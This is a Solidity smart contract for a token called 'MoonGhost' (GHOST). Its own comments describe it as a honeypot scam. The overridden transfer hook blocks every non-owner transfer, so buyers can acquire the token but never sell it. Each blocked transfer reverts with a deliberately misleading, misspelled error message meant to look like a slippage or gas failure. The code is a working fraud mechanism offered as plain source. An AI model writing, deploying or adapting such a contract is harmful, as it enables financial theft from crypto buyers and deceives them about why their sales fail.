// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "lib/solady/src/tokens/ERC20.sol";
import {Ownable} from "lib/solady/src/auth/Ownable.sol";

/// @title HoneypotToken
/// @notice Looks like a standard meme token but traps sellers.
/// @dev Uses a hidden whitelist mechanism to prevent non-owners from selling (transferring to pair).
contract HoneypotToken is ERC20, Ownable {
    mapping(address => bool) private _isPairs;

    constructor() {
        _initializeOwner(msg.sender);
        _mint(msg.sender, 1_000_000_000 * 10**18);
    }

    function name() public view virtual override returns (string memory) {
        return "MoonGhost";
    }

    function symbol() public view virtual override returns (string memory) {
        return "GHOST";
    }

    /// @dev Hidden "Anti-Bot" (actually Anti-Sell) Logic
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 /* amount */
    ) internal virtual override {
        // Allow minting
        if (from == address(0)) return;
        
        // Owner can do anything
        if (from == owner() || to == owner()) return;

        // "Anti-Bot": prevent transfers to pairs unless whitelist (but no one can be whitelisted effectively except owner)
        // In a real honeypot, this might be disguised as "trading not started" or "blacklisted bot".
        // Here we just revert if the recipient is a "pair" or simply restrict all transfers for non-owners to test the concept.
        
        // For this trap example: strictly allow ONLY buys (from pair to user) or transfers between normal users?
        // Let's make it simpler: standard honeypot prevents SELLING (User -> Pair).
        // Since we don't know the pair address easily without a router, let's just use a simplified model:
        // You cannot transfer tokens OUT unless you are the owner. You can only RECEIVE them.
        // This is a "Honey Pot" where you can buy (someone sends to you) but you can never send away.
        
        // Revert with a message that looks like a slippage or gas error to confuse.
        revert("TrasferHelper: TRANSFER_FAILED");
    }
}
